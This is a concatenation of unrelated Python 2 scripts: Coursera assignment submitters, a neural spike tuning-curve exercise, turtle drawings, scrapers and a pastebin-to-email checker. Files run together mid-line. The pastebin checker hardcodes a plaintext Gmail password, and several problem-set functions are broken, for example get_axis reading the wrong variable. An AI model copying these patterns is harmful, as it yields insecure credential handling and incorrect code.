    # actualTimes = get_actual_times('spikes_hard_practice_answers.npy')
    # APTime = bad_AP_finder(t, v)
    APTime = good_AP_finder(t, v)
    plot_spikes(t, v, APTime, 'Action Potentials in Raw Signal')
    plot_waveforms(t, v, APTime, 'Waveforms')
    # detector_tester(APTime,actualTimes)
### 
### Hello, curious student!  You shouldn't need to edit anything in this file 
###  (and if you do, there's a good chance you won't be able to upload your
###   answers to the problem set)
###
### All you need to do to submit your assigment is to "run" this file.  
###   In spyder:  load this in the editor and press the green arrow (or F5)
###   From the command prompt: "python problem_set1_submit.py"
###

import urllib
import urllib2
import hashlib
import random
import email
import email.message
import email.encoders
import StringIO
import sys
import datetime

""""""""""""""""""""
""""""""""""""""""""

class NullDevice:
  def write(self, s):
    pass

def submit():   
  print '==\n== [sandbox] Submitting Solutions \n=='
  
  (login, password) = loginPrompt()

  if not login:
    print '!! Submission Cancelled'
    return
  
  print '\n== Connecting to Coursera ... '

  # Part Identifier
#  (partIdx, sid) = partPrompt()

  for partIdx in range(len(partIds)):
    sid = partIds[partIdx]

    print '\n== ' + str(partIdx+1) + ' ' + str(sid)

    # Get Challenge
    (login, ch, state, ch_aux) = getChallenge(login, sid) #sid is the "part identifier"
    if((not login) or (not ch) or (not state)):
      # Some error occured, error string in first return element.
      print '\n!! Error: %s\n' % login
      return
      
    # Attempt Submission with Challenge
    ch_resp = challengeResponse(login, password, ch)
    (result, string) = submitSolution(login, ch_resp, sid, output(partIdx), \
                                        source(partIdx), state, ch_aux)

    print '== %s' % string.strip()


# =========================== LOGIN HELPERS - NO NEED TO CONFIGURE THIS =======================================

def loginPrompt():
  """Prompt the user for login credentials. Returns a tuple (login, password)."""
  (login, password) = basicPrompt()
  return login, password


def basicPrompt():
  """Prompt the user for login credentials. Returns a tuple (login, password)."""
  login = raw_input('Login (Email address): ')
  password = raw_input('One-time Password (from the assignment page. This is NOT your own account\'s password): ')
  return login, password

def partPrompt():
  print 'Hello! These are the assignment parts that you can submit:'
  counter = 0
  for part in partFriendlyNames:
    counter += 1
    print str(counter) + ') ' + partFriendlyNames[counter - 1]
  partIdx = int(raw_input('Please enter which part you want to submit (1-' + str(counter) + '): ')) - 1
  return (partIdx, partIds[partIdx])

def getChallenge(email, sid):
  """Gets the challenge salt from the server. Returns (email,ch,state,ch_aux)."""
  url = challenge_url()
  values = {'email_address' : email, 'assignment_part_sid' : sid, 'response_encoding' : 'delim'}
  data = urllib.urlencode(values)
  req = urllib2.Request(url, data)
  response = urllib2.urlopen(req)
  text = response.read().strip()

  # text is of the form email|ch|signature
  splits = text.split('|')
  if(len(splits) != 9):
    print 'Badly formatted challenge response: %s' % text
    return None
  return (splits[2], splits[4], splits[6], splits[8])

def challengeResponse(email, passwd, challenge):
  sha1 = hashlib.sha1()
  sha1.update("".join([challenge, passwd])) # hash the first elements
  digest = sha1.hexdigest()
  strAnswer = ''
  for i in range(0, len(digest)):
    strAnswer = strAnswer + digest[i]
  return strAnswer 
  
def challenge_url():
  """Returns the challenge url."""
  return "https://class.coursera.org/" + URL + "/assignment/challenge"

def submit_url():
  """Returns the submission url."""
  return "https://class.coursera.org/" + URL + "/assignment/submit"

def submitSolution(email_address, ch_resp, sid, output, source, state, ch_aux):
  """Submits a solution to the server. Returns (result, string)."""
  source_64_msg = email.message.Message()
  source_64_msg.set_payload(source)
  email.encoders.encode_base64(source_64_msg)

  output_64_msg = email.message.Message()
  output_64_msg.set_payload(output)
  email.encoders.encode_base64(output_64_msg)
  values = { 'assignment_part_sid' : sid, \
             'email_address' : email_address, \
             'submission' : output_64_msg.get_payload(), \
             'submission_aux' : source_64_msg.get_payload(), \
             'challenge_response' : ch_resp, \
             'state' : state \
           }
  url = submit_url()  
  data = urllib.urlencode(values)
  req = urllib2.Request(url, data)
  response = urllib2.urlopen(req)
  string = response.read().strip()
  result = 0
  return result, string

## This collects the source code (just for logging purposes) 
def source(partIdx):
  # open the file, get all lines
  f = open(sourceFiles[partIdx])
  src = f.read() 
  f.close()
  return src



############ BEGIN ASSIGNMENT SPECIFIC CODE - YOU'LL HAVE TO EDIT THIS ##############

from problem_set2 import load_experiment, load_neuraldata, bin_spikes
import numpy as np

# Make sure you change this string to the last segment of your class URL.
# For example, if your URL is https://class.coursera.org/pgm-2012-001-staging, set it to "pgm-2012-001-staging".
URL = 'neuraldata-001'

# the "Identifier" you used when creating the part
dev = ""


partIds = ['neuron1-%d%s' % (i,dev) for i in range(1,9)]+['neuron2-%d%s' % (i,dev) for i in range(1,9)]+['neuron3-%d%s' % (i,dev) for i in range(1,9)]
# used to generate readable run-time information for students
partFriendlyNames = ['Neuron1 %d/5' % (i) for i in range(1,9)]+['Neuron2 %d/5' % (i) for i in range(1,9)]+['Neuron3 %d/5' % (i) for i in range(1,9)]
# source files to collect (just for our records)
sourceFiles = ['problem_set2.py']*24

trials = load_experiment('trials.npy')   

          
def order_rates(direction_rates):
    sort_directions = np.argsort(map(lambda x: x[0], direction_rates))
    rates = np.array(map(lambda x: x[1], direction_rates))
    sort_rates = rates[sort_directions]
    return sort_rates
         
def output(partIdx):
  """Uses the student code to compute the output for test cases."""
  outputString = ''

  if partIdx < 8: # This is neuron1
      spikes = load_neuraldata('neuron1.npy')
      direction_rates = bin_spikes(trials,spikes,0.08)
      hist_vals = order_rates(direction_rates)
      result = hist_vals
      outputString = str(result[partIdx])+'\n'
  elif partIdx < 16:
      spikes = load_neuraldata('neuron2.npy')
      direction_rates = bin_spikes(trials,spikes,0.08)
      hist_vals = order_rates(direction_rates)
      result = hist_vals
      outputString = str(result[partIdx-8])+'\n'
  else: # This is spike_hard
      spikes = load_neuraldata('neuron3.npy')
      direction_rates = bin_spikes(trials,spikes,0.08)
      hist_vals = order_rates(direction_rates)
      result = hist_vals
      outputString = str(result[partIdx-16])+'\n'
          
  return outputString.strip()

submit()
#
#  NAME
#    problem_set2_solutions.py
#
#  DESCRIPTION
#    Open, view, and analyze action potentials recorded during a behavioral
#    task.  In Problem Set 2, you will write create and test your own code to
#    create tuning curves.
#

#Helper code to import some functions we will use
import numpy as np
import matplotlib.pylab as plt
import matplotlib.pyplot as p
import matplotlib.mlab as mlab
from scipy import optimize
from scipy import stats


def load_experiment(filename):
    """
    load_experiment takes the file name and reads in the data.  It returns a
    two-dimensional array, with the first column containing the direction of
    motion for the trial, and the second column giving you the time the
    animal began movement during thaht trial.
    """
    data = np.load(filename)[()];
    return np.array(data)


def load_neuraldata(filename):
    """
    load_neuraldata takes the file name and reads in the data for that neuron.
    It returns an arary of spike times.
    """
    data = np.load(filename)[()];
    return np.array(data)


def bin_spikes(trials, spk_times, time_bin):
    """
    bin_spikes takes the trials array (with directions and times) and the spk_times
    array with spike times and returns the average firing rate for each of the
    eight directions of motion, as calculated within a time_bin before and after
    the trial time (time_bin should be given in seconds).  For example,
    time_bin = .1 will count the spikes from 100ms before to 100ms after the
    trial began.

    dir_rates should be an 8x2 array with the first column containing the directions
    (in degrees from 0-360) and the second column containing the average firing rate
    for each direction
    """
    dir_rates = {}
    for direction, time in trials:
        selection = filter(
            lambda x: x >= time - time_bin and x <= time + time_bin,
            spk_times
        )
        dir_rates[direction] = dir_rates.get(direction, []) + [len(selection)]

    return np.array(list(sorted(map(
        lambda (direction, times): [
            direction,

            # avg and to sec
            sum(times) / float(len(times)) * (1 / (2 * time_bin))
        ],
        dir_rates.iteritems()
    ))))

def get_axis(direction_rates):
    directions = np.array(map(lambda x: x[0], bin_spikes))
    spike_counts = np.array(map(lambda x: x[1], bin_spikes))

    return directions, spike_counts


def plot_tuning_curves(direction_rates, title):
    """
    This function takes the x-values and the y-values  in units of spikes/s
    (found in the two columns of direction_rates) and plots a histogram and
    polar representation of the tuning curve. It adds the given title.
    """
    directions, spike_counts = get_axis(direction_rates)

    # print polar graph

    plt.subplot(2, 2, 2, polar=True)
    plt.title(title)

    theta = np.arange(0, 361, 45) * np.pi / 180
    plt.polar(theta, np.append(spike_counts, spike_counts[0]))
    plt.legend(["Firing rate (spikes/s)"], 8)


    # print histogram
    directions, spike_counts, roll = roll_axes(direction_rates)

    plt.subplot(2, 2, 1)
    plt.title(title)
    plt.xlabel("Direction of motion (degrees)")
    plt.ylabel("Firing rage (spikes/s)")
    max_y = (int(max(spike_counts)) / 10 + 1) * 10
    plt.axis([0 - roll, 360 - roll, 0, max_y])
    # plt.axis([0 - roll, 360 - roll, 0, max_y])
    # plt.xticks(np.arange(0, 361, 45))
    plt.xticks(np.arange(0 - roll, 361 - roll + 45, 45))
    plt.yticks(np.arange(0, max_y, 5))

    plt.bar(
        np.append(directions, directions[-1] + 45),
        np.append(spike_counts, spike_counts[0]),
        width=45
    )

    # plt.show()


def roll_axes(direction_rates):
    """
    roll_axes takes the x-values (directions) and y-values (direction_rates)
    and return new x and y values that have been "rolled" to put the maximum
    direction_rate in the center of the curve. The first and last y-value in the
    returned list should be set to be the same. (See problem set directions)
    Hint: Use np.roll()
    """
    directions, spike_counts = get_axis(direction_rates)

    max_index = list(spike_counts).index(max(spike_counts))
    middle_index = len(directions) / 2

    cnt = middle_index - max_index
    roll = cnt * 45 % 360

    directions = map(lambda x: x - roll, directions)


    return directions, np.roll(spike_counts, cnt), roll


def normal_fit(x,mu, sigma, A):
    """
    This creates a normal curve over the values in x with mean mu and
    variance sigma.  It is scaled up to height A.
    """
    n = A*mlab.normpdf(x,mu,sigma)
    return n


def fit_tuning_curve(centered_x,centered_y):
    """
    This takes our rolled curve, generates the guesses for the fit function,
    and runs the fit.  It returns the parameters to generate the curve.
    """

    return p



def plot_fits(direction_rates, fit_curve, title):
    """
    This function takes the x-values and the y-values  in units of spikes/s
    (found in the two columns of direction_rates and fit_curve) and plots the
    actual values with circles, and the curves as lines in both linear and
    polar plots.
    """
    x, y, roll = roll_axes(direction_rates)
    x = np.append(x, x[-1] + 45)
    y = np.append(y, y[0])

    plt.subplot(2, 2, 3)
    plt.title(title)
    plt.xlabel("Direction of motion (degrees)")
    plt.ylabel("Firing rage (spikes/s)")

    max_y = (int(max(y)) / 10 + 1) * 10

    plt.axis([0 - roll - 10, 360 - roll + 10, 0, max_y])
    plt.xticks(np.arange(0 - roll, 361 - roll, 45))
    plt.yticks(np.arange(0, max_y, 5))

    plt.plot(x, y, "o", hold=True)

    max_y = np.amax(y)
    max_x = x[np.argmax(y)]
    sigma = 90

    p, cov = optimize.curve_fit(fit_curve, x, y, p0=[max_x, sigma, max_y])
    fit_ys = fit_curve(x,p[0],p[1],p[2])

    plt.plot(x, fit_ys, "g-")

    # polar fit
    x, y = get_axis(direction_rates)
    x = np.append(x, x[-1] + 45)
    y = np.append(y, y[0])

    plt.subplot(2, 2, 4, polar=True)
    plt.title(title)

    theta = np.arange(0, 361, 45) * np.pi / 180
    plt.polar(theta, y, "o")

    max_y = np.amax(y)
    max_x = x[np.argmax(y)]
    sigma = 90

    p, cov = optimize.curve_fit(fit_curve, x, y, p0=[max_x, sigma, max_y])
    fit_ys = fit_curve(x,p[0],p[1],p[2])
    plt.polar(theta, fit_ys, "g-")
    plt.legend(["Firing rate (spikes/s)"], 8)

    print preferred_direction(zip(x, fit_ys))

    plt.show()


def von_mises_fitfunc(x, A, kappa, l, s):
    """
    This creates a scaled Von Mises distrubition.
    """
    return A*stats.vonmises.pdf(x, kappa, loc=l, scale=s)



def preferred_direction(fit_curve):
    """
    The function takes a 2-dimensional array with the x-values of the fit curve
    in the first column and the y-values of the fit curve in the second.
    It returns the preferred direction of the neuron (in degrees).
    """
    distances = []
    for x, y in fit_curve:
        distances.append(np.sqrt(x**2 + y**2))

    iom = distances.index(max(distances))

    return np.arctan2(fit_curve[iom][0], fit_curve[iom][1]) * 180 / np.pi


def count_dir_times(trials):
    """
    Count how many times was each direction used.
    """
    trials_per_dir = {}
    for direction, time in trials:
        trials_per_dir[direction] = trials_per_dir.get(direction, 0) + 1

    return trials_per_dir


##########################
#You can put the code that calls the above functions down here
if __name__ == "__main__":
    trials = load_experiment('trials.npy')
    # spk_times = load_neuraldata('neuron3.npy')
    spk_times = load_neuraldata('example_spikes.npy')

    # print count_dir_times(trials)
    # print spk_times
    # print len(spk_times)
    # print spk_times[0]

    # fig = plt.figure()
    # p.plot(spk_times)
    # p.show()
    # p.plot(range(len(spk_times)), spk_times, "|")
    # p.show()

    # print len(trials)
    # print len(spk_times)
    # print len(spk_times) / spk_times[-1]

    # bin_spikes = bin_spikes(trials, spk_times, 0.1)

    # plot_tuning_curves(bin_spikes, "Neuron tuning curve")
    # plot_fits(bin_spikes, normal_fit, "Tuning curve")
    print len(trials)
### Save this file back as problem_set0.py when you are done

'''
Part 1: Write a function that returns the string "hello, world"
'''

def hello_world():
    return "hello, world"

### The only things you'll have to edit (unless you're porting this script over to a different language) 
### are at the bottom of this file.

import urllib
import urllib2
import hashlib
import random
import email
import email.message
import email.encoders
import StringIO
import sys

""""""""""""""""""""
""""""""""""""""""""

class NullDevice:
  def write(self, s):
    pass

def submit():   
  print '==\n== [sandbox] Submitting Solutions \n=='
  
  (login, password) = loginPrompt()
  if not login:
    print '!! Submission Cancelled'
    return
  
  print '\n== Connecting to Coursera ... '

  # Part Identifier
#  (partIdx, sid) = partPrompt()

  partIdx = 0
  sid = partIds[partIdx]

  # Get Challenge
  (login, ch, state, ch_aux) = getChallenge(login, sid) #sid is the "part identifier"
  if((not login) or (not ch) or (not state)):
    # Some error occured, error string in first return element.
    print '\n!! Error: %s\n' % login
    return

  # Attempt Submission with Challenge
  ch_resp = challengeResponse(login, password, ch)
  (result, string) = submitSolution(login, ch_resp, sid, output(partIdx), \
                                  source(partIdx), state, ch_aux)

  print '== %s' % string.strip()


# =========================== LOGIN HELPERS - NO NEED TO CONFIGURE THIS =======================================

def loginPrompt():
  """Prompt the user for login credentials. Returns a tuple (login, password)."""
  (login, password) = basicPrompt()
  return login, password


def basicPrompt():
  """Prompt the user for login credentials. Returns a tuple (login, password)."""
  login = raw_input('Login (Email address): ')
  password = raw_input('One-time Password (from the assignment page. This is NOT your own account\'s password): ')
  return login, password

def partPrompt():
  print 'Hello! These are the assignment parts that you can submit:'
  counter = 0
  for part in partFriendlyNames:
    counter += 1
    print str(counter) + ') ' + partFriendlyNames[counter - 1]
  partIdx = int(raw_input('Please enter which part you want to submit (1-' + str(counter) + '): ')) - 1
  return (partIdx, partIds[partIdx])

def getChallenge(email, sid):
  """Gets the challenge salt from the server. Returns (email,ch,state,ch_aux)."""
  url = challenge_url()
  values = {'email_address' : email, 'assignment_part_sid' : sid, 'response_encoding' : 'delim'}
  data = urllib.urlencode(values)
  req = urllib2.Request(url, data)
  response = urllib2.urlopen(req)
  text = response.read().strip()

  # text is of the form email|ch|signature
  splits = text.split('|')
  if(len(splits) != 9):
    print 'Badly formatted challenge response: %s' % text
    return None
  return (splits[2], splits[4], splits[6], splits[8])

def challengeResponse(email, passwd, challenge):
  sha1 = hashlib.sha1()
  sha1.update("".join([challenge, passwd])) # hash the first elements
  digest = sha1.hexdigest()
  strAnswer = ''
  for i in range(0, len(digest)):
    strAnswer = strAnswer + digest[i]
  return strAnswer 
  
def challenge_url():
  """Returns the challenge url."""
  return "https://class.coursera.org/" + URL + "/assignment/challenge"

def submit_url():
  """Returns the submission url."""
  return "https://class.coursera.org/" + URL + "/assignment/submit"

def submitSolution(email_address, ch_resp, sid, output, source, state, ch_aux):
  """Submits a solution to the server. Returns (result, string)."""
  source_64_msg = email.message.Message()
  source_64_msg.set_payload(source)
  email.encoders.encode_base64(source_64_msg)

  output_64_msg = email.message.Message()
  output_64_msg.set_payload(output)
  email.encoders.encode_base64(output_64_msg)
  values = { 'assignment_part_sid' : sid, \
             'email_address' : email_address, \
             'submission' : output_64_msg.get_payload(), \
             'submission_aux' : source_64_msg.get_payload(), \
             'challenge_response' : ch_resp, \
             'state' : state \
           }
  url = submit_url()  
  data = urllib.urlencode(values)
  req = urllib2.Request(url, data)
  response = urllib2.urlopen(req)
  string = response.read().strip()
  result = 0
  return result, string

## This collects the source code (just for logging purposes) 
def source(partIdx):
  # open the file, get all lines
  f = open(sourceFiles[partIdx])
  src = f.read() 
  f.close()
  return src



###### BEGIN ASSIGNMENT SPECIFIC CODE - YOU'LL HAVE TO EDIT THIS ###########

from problem_set0 import hello_world

URL = 'neuraldata-001'

partIds = ['hello-world']                        
partFriendlyNames = ['submit your first assignment'] 
sourceFiles = ['problem_set0.py']                           
          
def output(partIdx):
  outputString = ''

  if partIdx == 0: # This is the hello_world() string generator
    resultString = hello_world()
    if type(resultString) == type(None):
      resultString = 'None'
    outputString = resultString + '\n'

  return outputString.strip()

submit()


#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import turtle as t
from math import floor


# Variables ===================================================================
ONE = 2


# Functions & classes =========================================================
def rt(angle=90):
    t.rt(angle)


def lt(angle=90):
    t.lt(angle)


def draw_0(left=1, right=1):
    t.width(ONE / 1.2)

    lt()
    t.fd(ONE*left)
    lt(180)
    t.fd((ONE*left) + (ONE*right))
    rt(180)
    t.fd(ONE*right)
    rt()

    t.width(1)


def draw_n(n):
    params = ((1,), (3,), (1, 3), (3, 3))

    draw_0(*params[n])


def forward(size):
    t.fd(size-floor(size))

    for pix in range(int(floor(size))):
        t.fd(1)

        if pix % 7 == 0:
            draw_n(pix % 4)


# Main program ================================================================
if __name__ == "__main__":
    t.speed(0)
    forward(50)
    t.exitonclick()#! /usr/bin/env python
import turtle as t
from math import floor

BLUE = "#446785"
YELLOW = "#d5ad42"
TURN = 50.0
SPACE = TURN / 4
ONE = 2


def r(angle=90):
    t.rt(angle)


def l(angle=90):
    t.lt(angle)


def draw_0(left=1, right=1):
    t.width(ONE / 1.2)

    l()
    t.fd(ONE*left)
    l(180)
    t.fd((ONE*left) + (ONE*right))
    r(180)
    t.fd(ONE*right)
    r()

    t.width(1)


def draw_n(n):
    params = ((1,), (3,), (1, 3), (3, 3))

    draw_0(*params[n])


def lc():
    for i in range(90):
        f(2 * 3.14 * TURN / 360.0)
        t.lt(1)


def rc():
    t.rt(180)
    t.circle(TURN, -90)
    t.rt(180)


def f(size):
    t.fd(size-floor(size))

    for pix in range(int(floor(size))):
        t.fd(1)

        if pix % 7 == 0:
            draw_n(pix % 4)


def half_logo():
    edge = TURN * 2
    h_edge = edge / 2
    h_space = SPACE / 2

    f(h_edge)
    lc()
    f(edge)
    lc()
    f(edge)
    lc()
    f(h_edge - h_space)
    l()
    f(TURN + h_edge)
    r()
    f(SPACE)
    r()
    f(TURN + edge)
    lc()
    f(edge)
    lc()
    f(h_edge - SPACE)
    l()
    f(h_edge + h_space)
    rc()
    f(h_edge + SPACE)



t.speed(0)

t.color(YELLOW)
t.fillcolor(BLUE)
t.fill(True)
half_logo()
t.fill(False)

t.pu()
r()
t.fd(SPACE)
r()
t.pd()


t.color(BLUE)
t.fillcolor(YELLOW)
t.fill(True)
half_logo()
t.fill(False)

t.exitonclick()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import turtle as t


# Variables ===================================================================
LENGTH = 20


# Functions & classes =========================================================
def r():
    t.fd(-LENGTH/2)
    t.rt(90)
    t.fd(LENGTH)

    # t.rt(180)
    # t.circle(10.0, -90)
    # t.rt(180)


def l():
    t.lt(90)
    t.fd(LENGTH)
    t.fd(-LENGTH/2)

    # t.circle(10.0, 90)


def iterate_curve(old_seq):
    return old_seq + "r" + "".join(
        "l" if char == "r" else "r"
        for char in reversed(old_seq)
    )


def draw_seq(seq):
    for char in seq:
        globals()[char]()


# Main program ================================================================
if __name__ == '__main__':
    t.ht()
    t.speed(0)
    t.pd()

    cnt = 9
    seq = "r"
    while cnt:
        cnt -= 1

        print seq
        seq = iterate_curve(seq)

    draw_seq(seq)
    t.rt(90)
    draw_seq(seq)

t.exitonclick()#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import os.path
import argparse

from tqdm import tqdm
from sqlitedict import SqliteDict
from marcxml_parser import MARCXMLRecord


# Functions & classes =========================================================
def _pick_examples(db, field):
    """
    Go thru downloaded data stored in `db` and filter keywords, which are
    parsed and then yielded.

    Shows nice progress bar.

    Args:
        db (obj): Opened database connection.

    Yields:
        obj: :class:`KeywordInfo` instances for yeach keyword.
    """
    for key, val in tqdm(db.iteritems(), total=len(db)):
        # skip counter of the last downloaded document
        if key == "last_id":
            continue

        # this is optimization to speed up skipping of the unwanted elements
        # by the factor of ~20
        piece = val[:500] if len(val) > 500 else val
        if '<fixfield id="FMT">SE' not in piece.lower():
            continue

        parsed = MARCXMLRecord(val)

        val = parsed[field]

        if val:
            print val
            yield str(val)


def generate(cache_fn, field):
    """
    Go thru `cache_fn` and filter keywords. Store them in `keyword_list.json`.

    Args:
        cache_fn (str): Path to the file with cache.

    Returns:
        list: List of periode examples.
    """
    if not os.path.exists(cache_fn):
        print >> sys.stderr, "Can't access `%s`!" % cache_fn
        sys.exit(1)

    with SqliteDict(cache_fn) as db:
        return [
            item
            for item in _pick_examples(db, field)
        ]


# Main program ================================================================
if __name__ == '__main__':
    default_cache_fn = "./aleph_kw_index.sqlite"
    default_output_fn = "./periode_exmaples.txt"
    default_field = "260c"

    parser = argparse.ArgumentParser(
        description="""This script is used to pick examples of the records in
        Aleph."""
    )
    parser.add_argument(
        "-c",
        "--cache",
        default=default_cache_fn,
        help="Name of the cache file. Default `%s`." % default_cache_fn
    )
    parser.add_argument(
        "-o",
        "--output",
        default=default_output_fn,
        help="Name of the output file. Default `%s`." % default_output_fn
    )
    parser.add_argument(
        "-f",
        "--field",
        default=default_field,
        help="Name of the output field. Default `%s`." % default_field
    )

    args = parser.parse_args()

    print "Picking examples of `%s`.." % args.field

    with open(args.output, "w") as f:
        f.write(
            "\n".join(generate(args.cache, args.field))
        )

    print "Done. Saved to `%s`." % args.output
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from collections import namedtuple

import dhtmlparser  # pip install -U dhtmlparser
from httpkie import Downloader  # pip install -U httpkie


# Variables ===================================================================
downloader = Downloader()
MIPSInfo = namedtuple("MIPSInfo", "name mips year")


# Functions & classes =========================================================
def get_table():
    page = downloader.download(
        "https://en.wikipedia.org/wiki/Instructions_per_second"
    )

    dom = dhtmlparser.parseString(page)

    return dom.find("table", {"class": "wikitable sortable"})[0]


def parse_table():
    for tr in get_table().find("tr"):
        tds = tr.find("td")

        if not tds:
            continue

        name = dhtmlparser.removeTags(tds[0])
        mips = dhtmlparser.removeTags(tds[1])
        year = dhtmlparser.removeTags(tds[4])

        # clean mips
        mips = mips.replace("&#160;", " ")
        mips = mips.split("MIPS")[0].replace(",", "").strip()

        yield MIPSInfo(name, float(mips), int(year))


# Main program ================================================================
if __name__ == '__main__':
    # parsed = list(parse_table())
    # x_vals = [item.year for item in parsed]
    # y_vals = [item.mips for item in parsed]

    print "\n".join(
        "; ".join(str(x) for x in item)
        for item in parse_table()
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys


# Variables ===================================================================



# Functions & objects =========================================================
def read_file(fn):
    with open(fn) as f:
        return f.read()


def split_by_digit(inp):
    inp = list(inp.split()[0])

    out = ""
    for c in inp:
        if c.isdigit():
            return out

        out += c

    return out


# Main program ================================================================
if len(sys.argv) != 3:
    print "Usage: ./%s old_selection new_selection" % sys.argv[0]
    sys.exit(1)
old = read_file(sys.argv[1]).splitlines()
new = read_file(sys.argv[2]).splitlines()

new_set = set(map(lambda x: split_by_digit(x), new))

diff = filter(lambda x: split_by_digit(x) not in new_set, old)

print "\n".join(diff)#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
http://stackoverflow.com/questions/19960243/how-to-store-ip-address-range-vs-location
by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
in_file = """10.1.100.200- 10.1.100.800              x
10.1.101.200- 10.1.101.800              Y
10.1.102.200- 10.1.102.800              Z"""


def ipToIntArray(s):
	"""Convert string with IP address into array of numbers"""

	return map(lambda x: int(x), s.split("."))


def parseString(s):
	"""
	Parse string in user-defined format into dictionary:

	---
	10.1.100.200- 10.1.100.800              x
	---

	will be parsed into:

	{
		"f_range": [10.1.100.200]
		"t_range": [10.1.100.800]
		"name":    "x"
	}

	Return array of dicts.
	"""
	data = []
	for line in s.splitlines():
		# skip blank lines
		if line.strip() == "":
			continue

		ranges = line.split("-")
		f_range = ranges[0].strip()
		# parse "10.1.102.800              Z" -> t_range, name
		t_range, name = map(lambda x: x.strip(), ranges[1].strip().split())

		data.append({
			"f_range": ipToIntArray(f_range),
			"t_range": ipToIntArray(t_range),
			"name":    name
		})

	return data


def fitsIntoRange(ip, range_dict):
	"""
	Return True if 'ip' fits into given "range_dict".

	ip -- string or value returned from ipToIntArray()
	range_dict -- one parsed line from parseString()
	"""
	if isinstance(ip, str):
		ip = ipToIntArray(ip)

	bigger  = all(map(lambda x: x[0] >= x[1], zip(ip, range_dict["f_range"])))
	smaller = all(map(lambda x: x[0] <= x[1], zip(ip, range_dict["t_range"])))

	return (bigger and smaller)


def findFittingNames(ip, s):
	"""
	Return array of names in which 'ip' belongs.
	"""
	if isinstance(s, str):
		data = parseString(s)

	return map(lambda x: x["name"], filter(lambda x: fitsIntoRange(ip, x), data))



if __name__ == '__main__':
	# example
	print findFittingNames("10.1.100.202", in_file)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ pastebin.com.checker v1.0.2 (23.07.09) by Bystroushaak - bystrousak@kitakitsune.org.
#~ This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
#~ Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cs/).
#~ Created in gedit text editor.
#~
##~ Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
##~ emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
##~ U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
##~ i nekomu jinemu nez mne. Diky
#~
#~ Notes:
    #~  This script sends new personal pastebin.com post on your mail.
    #~  You need gmail account, which will be used for sending mails.
    
# imports
import urllib2
import smtplib
import sys

# variables
rootlink= "http://benny.pastebin.com"
database= "/home/bystrousak/scripty/pastebin.com.dtb"            # filename of old links database

## mail config
mfrom= "pastebin.com.checker@gmail.com"
mto= "bystrousak@kitakitsune.org"
msubj= "Changes on " + rootlink

msmtp= "smtp.gmail.com"                 # smtp server
mnick= "pastebin.com.checker"           # username (gmail username in this case)
mpass= "supertajnehesloprogmailucetcheckerupastebin.com"  # password (gmail pass)

# functions & objects
def sendMail(links):    
    msg = "From: %s\r\nSubject: %s\r\nTo: %s\r\n\r\n" % (mfrom, msubj, mto)
    
    for i in links:
        msg+= "----------------New post ( " + i + " )----------------"
        msg+= "\n\n"
        msg+= parseContent(downloadLink(i))
        msg+= "\n\n"
        msg+= 80 * "-"
        msg+= "\n"
    
    server = smtplib.SMTP(msmtp)
    server.ehlo()
    server.starttls()
    server.ehlo()

    server.login(mnick, mpass)
    server.sendmail(mfrom, mto, msg)
    server.quit()

# Parse users source code
def parseContent(string):
    string= string.splitlines()
    
    output= []
    stav= 0
    for i in string:
        if i.endswith('</textarea>'):    # end tag
            output.append(i.split('</')[0])
            stav= 0
        if stav == 1:
            output.append(i)
        if i.startswith('<textarea id="code"'):  # start tag
            stav= 1
            output.append(i.split('">')[1])
    
    output= "\n".join(output)
    
    ## replacing html entities
    output= output.replace("&lt;", "<")
    output= output.replace("&gt;", ">")
    output= output.replace("&quot;", '"')
    
    output= output.replace("&amp;", "&")    # must be last
    
    return output
    
# Parse list of links
def parseList(string):
    string= string.splitlines()
    newlist= []
    
    ## parse Recent post
    stav= 0
    for i in string:
        if i == """<li><a rel="nofollow" href="/pastebin.php">Make new post</a></li></ul>""":   # end tag
            stav= 0
        if stav:
            newlist.append(i)
        if i == "<h1>Recent Posts</h1>":    # start tag
            stav= 1
            
    newlist= newlist[1:]    # remove <ul> at first index
    
    ## parse links
    links= []
    for i in newlist:
        links.append(i.split('"')[1])
    
    return links

# Create file with actual links
def createDb(data):
    try:
        file= open(database, "w")
        file.write("\n".join(data))
        file.close()
    except IOError, e:
        print "Error!"
        print "Read only filesystem?"
        print e

# Download url
def downloadLink(url):
    try:
        fp= urllib2.urlopen(url)
        data= fp.read()
        fp.close()
    except:
        print "Error!!"
        print "Cant download", url
        sys.exit()
        
    return data

# main program
## download rootlink and parse actual list
print "\tDownloading", rootlink, "..",
newlist= downloadLink(rootlink)
print "done."

## parse links from downloaded html 
try:
    print "\tParsing list from", rootlink, "..",
    newlist= parseList(newlist)
    print "done."
except:
    print "Error!!"
    print "Cant parse list from", rootlink
    sys.exit()

## open saved list (for compare with parsed list)
try:
    file= open(database, "r")
    oldlist= file.read().splitlines()
    file.close()
except IOError, e:
    createDb(newlist)
    oldlist= [""]
    
## compare saved list with downloaded list
print "\tFinding news ..",
if newlist != oldlist:
    print "found."
    
    ## comparing..
    newlinks= []
    for i in range(10):
        if oldlist[0] == newlist[i]:
            newlinks= newlist[:i]
            
    if newlinks == []:
        newlinks= newlist
    
    ## print new links
    for i in newlinks:
        print "\t\tNew:", i
    
    ## send information email
    print "\tSending mail to", mto, "..",
    sendMail(newlinks)
    print "done."
    
    ## save new links as old links
    print "\tSaving new list ..",
    createDb(newlist)
    print "done."
else:
    print "no news."
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
import matplotlib.pyplot as plt
from datetime import timedelta, date


